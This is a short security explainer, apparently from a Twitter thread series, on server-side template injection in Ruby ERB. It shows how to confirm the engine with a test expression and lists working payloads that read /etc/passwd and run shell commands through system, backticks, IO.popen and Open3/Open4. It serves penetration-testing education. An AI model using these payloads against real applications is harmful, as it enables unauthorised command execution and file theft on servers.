### SecurityExplained S-59: Ruby ERB SSTI

```
Server-Side Template Injection (SSTI) vulnerabilities occurs when an user-supplied data is inserted into a template and insecurely evaluated as an expression by the template engine. This may allow an attacker to trick the template engine into evaluation an expression that could allow an attacker to execute system commands or gain a remote shell. 

To look for template injection vulnerability, it is essential to enumerate and know if the template engine is in use. If the application uses template engine, the next thing is to know what language based template injection is used and what all classes and methods are accessible that could be chained together to perform the desired action. 

# Looking for Template Injection in Ruby ERB: 

1. Let's assume the target application is running Ruby and a specific input field/functionality looks like using a template engine. 
2. Now, try a simple payload like: <%=7*7%> 
3. If the output is "49", it is confirmed that the application makes use of Ruby ERB Template Engine. 


After confirming the template engine as Ruby ERB, one can try for following payloads for actions such as local file read or command execution: 

<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>


A detailed write up on Ruby ERB Template Injection by TrustedSec: https://www.trustedsec.com/blog/rubyerb-template-injection/

```

[Follow Twitter Thread](https://twitter.com/harshbothra_/status/1498324305872318464)
